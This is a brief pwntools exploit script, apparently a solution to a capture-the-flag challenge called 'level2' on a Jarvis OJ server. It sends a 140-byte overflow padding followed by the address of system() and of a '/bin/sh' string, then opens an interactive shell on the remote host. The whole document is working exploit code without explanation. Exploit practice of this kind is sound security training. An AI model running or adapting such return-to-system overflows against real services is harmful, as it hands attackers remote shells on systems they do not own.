from pwn import *

elf = ELF('level2')
system = elf.symbols['system']
binsh = 0x0804A024

io = remote('pwn2.jarvisoj.com', 9878)
io.recvline()
io.sendline('a'*140 + p32(system) + p32(0xdeadbeef) + p32(binsh))
io.interactive()
